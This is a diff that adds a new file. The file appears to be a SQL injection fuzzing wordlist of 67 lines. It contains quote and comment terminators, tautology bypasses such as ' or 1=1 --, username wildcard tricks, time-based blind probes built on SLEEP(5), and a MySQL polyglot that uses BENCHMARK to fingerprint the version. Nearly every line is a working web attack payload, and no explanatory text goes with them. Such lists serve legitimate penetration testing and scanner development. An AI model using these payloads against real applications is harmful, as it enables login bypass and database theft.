@@ -1,0 +1,67 @@
+<>"'%)(&+;|#--/*
+--
+/*
+#
+;
+'
+' --
+' /*
+' #
+';
+"
+" --
+" /*
+" #
+";
+*|
+*/*
+|
+!
+?
+&
+/
+//
+//*
+(
+)
+*
+'";
+"';
+';%00
+";%00
+;%00
+' or 1=1 --
+" or 1=1 --
+or 1=1 --
+' or 1=1 #
+" or 1=1 #
+or 1=1 #
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+' or 1=1;#
+order by
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+--sp_password
+' or (EXISTS)
++SLEEP(5)
++SLEEP(5) --
++SLEEP(5) /*
++SLEEP(5) #
++SLEEP(5);
+' OR SLEEP(5)
+' OR SLEEP(5) --
+' OR SLEEP(5) /*
+' OR SLEEP(5) #
+' OR SLEEP(5);
+" OR SLEEP(5)
+" OR SLEEP(5) --
+" OR SLEEP(5) /*
+" OR SLEEP(5) #
+" OR SLEEP(5);
+SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
